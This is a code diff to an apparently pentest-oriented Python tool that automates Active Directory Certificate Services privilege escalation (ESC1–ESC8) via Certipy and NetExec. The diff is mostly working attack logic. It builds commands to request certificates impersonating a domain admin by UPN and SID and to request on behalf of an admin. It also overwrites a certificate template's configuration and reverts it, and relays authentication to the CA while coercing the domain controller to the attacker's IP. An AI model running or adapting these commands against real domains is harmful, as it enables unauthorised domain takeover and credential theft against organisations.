@@ -101,108 +101,94 @@ def find_esc_vulns(certipy_dir):
         return None
 
 # === ESC Handlers ===
-def handle_ESC1(args, selected_template, selected_admin, target):
-    certipy_ESC1(args, selected_template, selected_admin, target)
+def handle_ESC1(args, selected_template, target):
+    certipy_ESC1(args, selected_template, target)
 
-def handle_ESC2(args, selected_template, selected_admin, target):
+def handle_ESC2(args, selected_template, target):
     q = input(f"\033[93m[?] ESC2 can be exploited 2 ways: ESC1-style(e), on-behalf-of(o):\033[0m ").lower()
     if q == "e":
-        certipy_ESC1(args, selected_template, selected_admin, target)
+        certipy_ESC1(args, selected_template, target)
     elif q == "o":
-        certipy_ESC2(args, selected_template, selected_admin, target)
+        certipy_ESC2(args, selected_template, target)
 
-def handle_ESC3(args, selected_template, selected_admin, target):
-    certipy_ESC2(args, selected_template, selected_admin, target)
+def handle_ESC3(args, selected_template, target):
+    certipy_ESC2(args, selected_template, target)
 
-def handle_ESC4(args, selected_template, selected_admin, target):
-    certipy_ESC4(args, selected_template, selected_admin, target)
+def handle_ESC4(args, selected_template, target):
+    certipy_ESC4(args, selected_template, target)
 
-def handle_ESC5(args, selected_template, selected_admin, target):
-    certipy_ESC5(args, selected_template, selected_admin, target)
+def handle_ESC5(args, selected_template, target):
+    certipy_ESC5(args, selected_template, target)
 
-def handle_ESC6(args, selected_template, selected_admin, target):
-    certipy_ESC6(args, selected_template, selected_admin, target)
+def handle_ESC6(args, selected_template, target):
+    certipy_ESC6(args, selected_template, target)
 
-def handle_ESC7(args, selected_template, selected_admin, target):
+def handle_ESC7(args, selected_template, target):
     certipy_ESC7(args, selected_template, target)
 
-def handle_ESC8(args, selected_template, selected_admin, target):
+def handle_ESC8(args, selected_template, target):
     certipy_ESC8(args, target)
 
 
 # === ESC Exploits ===
-def certipy_ESC1(args, selected_template, selected_admin, target):
-    template_name = selected_template[1]
-    ca_name = selected_template[2]
-    admin_account, sid = selected_admin.split(":")
-    upn = admin_account.strip()
-    cmdsid = sid.strip()
-    
-    #request admin cert
-    command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
-    print(f"\n\033[96m[*] Requesting certificate using Certipy template '{template_name}' for user '{admin_account.strip()}'...\n\033[0m\033[0m")
-    print(f"\033[96m[*] Running: {command}\033[0m")
-    subprocess.run(command, shell=True)
+def certipy_req(args, selected_template, victim, target):
+    username, sid = ldap_queries.get_user_sid(args,victim)
+    cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {victim} -template {selected_template[1]} -ca {selected_template[2]} -target {target} -sid {sid} -out {victim}_{selected_template[1]}"
+    if commands.TPI(cmd):
+        commands.single_command(cmd, target, "blue")
 
-def certipy_ESC2(args, selected_template, selected_admin, target):
-    template_name = selected_template[1]
-    ca_name = selected_template[2]
-    admin_account, sid = selected_admin.split(":")
-    admin_account2, garbage = admin_account.split("@")
-    userSID = ldap_queries.get_user_sid(args, args.domain_user)
-    
-    #Request user cert
-    esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template {template_name} -ca {ca_name} -sid {userSID}"
-    print(f"\033[96mESC2 attack with: {esc2_cmd}\033[0m")
-    subprocess.call(esc2_cmd, shell=True)
+def certipy_ESC1(args, selected_template, target):
+    selected = ldap_queries.get_da_info(args).split(":")
+    certipy_req(args, selected_template, selected[0], target)
+
+def certipy_ESC2(args, selected_template, target):
+    admin_account, domain, sid = ldap_queries.get_da_info(args).split(":")
+    certipy_req(args, selected_template, args.domain_user, target)
     
     netbiosname = ldap_queries.get_netbios_name(args)
     
     #Request on behalf of admin 
-    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template User -ca {ca_name} -on-behalf-of '{netbiosname}\\{admin_account2}' -pfx {args.domain_user}.pfx -sid {sid}"
-    print(f"\033[96m[*] Running {esc2_pfx_cmd}\033[0m")
-    subprocess.call(esc2_pfx_cmd, shell=True)
+    cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template User -ca {selected_template[2]} -on-behalf-of '{netbiosname}\\{admin_account}' -pfx {args.domain_user}_{selected_template[1]}.pfx -sid {sid} -out {admin_account}_{selected_template[1]}"
+    if commands.TPI(cmd):
+        commands.single_command(cmd, target, "blue")
 
-def certipy_ESC4(args, selected_template, selected_admin, target):
+def certipy_ESC4(args, selected_template, target):
     template_name = selected_template[1]
     ca_name = selected_template[2]
 
     # Overwrite template config
-    esc4_write = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -save-configuration ESC4Save -write-default-configuration" 
-    print(f"\033[96m[*] Running {esc4_write}\033[0m")
-    subprocess.run(esc4_write, shell=True)
+    cmd = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -write-default-configuration -force" 
+    if commands.TPI(cmd):
+        commands.single_command(cmd, target, "blue")
 
     # Run ESC1 against modified template
-    certipy_ESC1(args, selected_template, selected_admin, target)
+    admin_account, domain, sid = ldap_queries.get_da_info(args).split(":")
+    certipy_req(args, selected_template, admin_account, target)
 
     # Revert config
-    esc4_revert = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -write-configuration ESC4Save.json"
-    print(f"\033[96m[*]Running {esc4_revert}\033[0m")
-    subprocess.run(esc4_revert, shell=True)
+    cmd2 = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -write-configuration {template_name}.json -no-save -force"
+    if commands.TPI(cmd2):
+        commands.single_command(cmd2, target, "blue")
 
-def certipy_ESC5(args, selected_template, selected_admin, target):
+def certipy_ESC5(args, selected_template, target):
     print("[!] ESC5 exploitation not implemented.")
 
-def certipy_ESC6(args, selected_template, selected_admin, target):
-    template_name = "user"
-    ca_name = selected_template[2]
-    admin_account, sid = selected_admin.split(":")
-    upn = admin_account.strip()
-    cmdsid = sid.strip()
-    
+def certipy_ESC6(args, selected_template, target):
+    admin_account, domain, sid = ldap_queries.get_da_info(args).split(":")
+    temp = list(selected_template)
+    temp[1] = f"user"
+    selected_template = tuple(temp)
     #request admin cert (this is different from esc1 because ANY certificate could be used)
-    command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
-    print(f"\n\033[96m[*] Requesting certificate using Certipy template '{template_name}' for user '{upn}'...\n\033[0m\033[0m")
-    print(f"\033[96m[*] Running: {command}\033[0m")
-    subprocess.run(command, shell=True)
+    certipy_req(args, selected_template, admin_account.strip(), target)
 
-def certipy_ESC7(args, selected_template, selected_admin, target):
+def certipy_ESC7(args, selected_template, target):
     print("[!] ESC7 exploitation not implemented.", target)
 
-def certipy_ESC8(args, selected_template, selected_admin, target):
+def certipy_ESC8(args, target):
     local_ip = general.get_local_ip()
     cmds = [
         f"certipy.pyz relay -target {target} -template DomainController | tee ActiveDirectory/ADCS/esc_8",
         f"nxc smb {args.dc_ip} -u {args.domain_user} -p {args.domain_pass} -d {args.domain} -M coerce_plus -o L={local_ip}"
     ]
-    commands.threaded_commands(cmds, target, "cyan")
+    if commands.TPI(cmds[1]):
+        commands.threaded_commands(cmds, target, "cyan")
